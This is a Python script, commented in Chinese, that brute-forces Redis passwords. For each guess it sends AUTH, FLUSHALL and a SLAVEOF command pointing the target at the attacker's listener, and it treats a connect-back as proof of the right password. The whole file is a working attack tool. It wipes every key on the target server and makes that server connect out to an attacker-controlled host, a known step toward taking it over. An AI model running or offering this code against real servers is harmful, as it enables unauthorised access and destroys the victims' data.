from socket import socket, AF_INET,SOCK_STREAM,SOL_SOCKET,SO_REUSEADDR
from threading import Thread
from random import shuffle
from time import sleep

passContent = None
CRLF = "\r\n"
pad = "\n"
finish = False
waitDict = {}
passDict = {}
result = None

class _List(list):

    def __init__(self, seq=()):
        super(_List, self).__init__(seq)

    def readline(self):
        try:
            return self.pop(0).encode()
        except IndexError:
            return b''

    def close(self):
        self.clear()

class _Listen(Thread):
    def __init__(self,port,name):
        super(_Listen, self).__init__()
        self.setDaemon(True)
        self.port = port
        self.thisName = name

    def run(self):
        global waitDict,result
        print(f"<<< Try to listen port -> {self.port} >>>")
        s = socket(AF_INET, SOCK_STREAM)
        s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", self.port))
        s.listen(1)
        s.accept()
        print(f"<<< success from {self.thisName} >>>")
        result = passDict[self.thisName]
        waitDict.update({self.thisName:True})

class _Run(Thread):

    def __init__(self,host:str,listenHost:str,port:int,waitTime:float):
        global waitDict
        super(_Run, self).__init__()
        self.setDaemon(True)
        self.host = tuple(int(each) if each.isalnum() else each for each in host.split(":"))
        self.port = port
        self.listHost = listenHost
        self.thisName = self.getName()
        self.waitTime = waitTime
        waitDict.update({self.thisName:False})

    def run(self):
        global passContent,passDict,result,finish
        _Listen(port=self.port,name=self.getName()).start()

        while not waitDict[self.thisName]:
            passwd = passContent.readline().decode()
            if passwd.find(pad) > -1 and passwd.rsplit(pad,1)[1] == "":
                passwd = passwd[:-len(pad)]
            passDict.update({self.thisName:passwd})
            if passwd != '':
                s = socket(AF_INET, SOCK_STREAM)
                s.connect(self.host)
                payload = "".join(_redis_format(*line) for line in [
                    ["auth", f'{passwd}'] if passwd else [],
                    ["flushall"],
                    ["slaveof", "no", "one"],
                    ["slaveof", self.listHost, str(self.port)]
                ]).encode()
                s.send(payload)
                s.close()
            else:
                waitDict.update({self.thisName:True})
                return
            sleep(self.waitTime)
        finish = True

def _redis_format(*redis_cmd):
    if len(redis_cmd) == 0:
        return ""

    cmd = f"*{len(redis_cmd)}"
    for line in redis_cmd:
        cmd += f"{CRLF}${len(line)}{CRLF}{line}"
    cmd += CRLF
    return cmd

def goBrute(host:str,listenHost:str,listenPorts:list,threadNum:int,passList,waitTime:float):

    global passContent

    if isinstance(passList,str):
        try:
            passContent = open(passList,"rb")
        except FileNotFoundError:
            raise Exception("File not found...")
        except OSError:
            raise  Exception("File can't be read...")
    elif isinstance(passList,list):
        passContent = _List(passList)
    else:
        raise  Exception("Error passList...")

    shuffle(listenPorts)
    for each in range(threadNum):
        try:
            _Run(host,listenHost,listenPorts.pop(),waitTime).start()
        except IndexError:
            break

    while not finish:
        try:
            if not bool(sum(not each for each in waitDict.values())):
                break
            sleep(waitTime)
        except KeyboardInterrupt:
            print("<<< bye!!! >>>")
            passContent.close()
            exit()

    if result is not None:
        print(f"<<< get result -> {result} >>>")
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(tuple(int(each) if each.isalnum() else each for each in host.split(":")))
        payload = "".join(_redis_format(*line) for line in [
            ["auth", f'{result}'] if result else [],
            ["flushall"],
            ["slaveof", "no", "one"],
        ]).encode()
        s.send(payload)
        s.close()
    else:
        print("<<< failed... >>>")

if __name__ == '__main__':

    """
        @ host = 目标地址
        @ listenHost = 本机地址
        @ listenPorts = 监听端口范围
        @ threadNum = 开启的线程数
        @ passList = [filePath/List] 密码字典，可以是文件路径或纯列表
        @ waitTime = 每次爆破间隔(redis密码爆破需要许些时间监听端口判断是否成功认证)

    """

    password = [
        "123",
        "123456",
        "1234567",
        "23333"
    ]
    #password = "./password.txt"


    goBrute(
        host="192.168.111.142:6379",
        listenHost="192.168.111.133",
        listenPorts=[port for port in range(3200,3210)],
        threadNum=5,
        passList=password,
        waitTime=2
    )


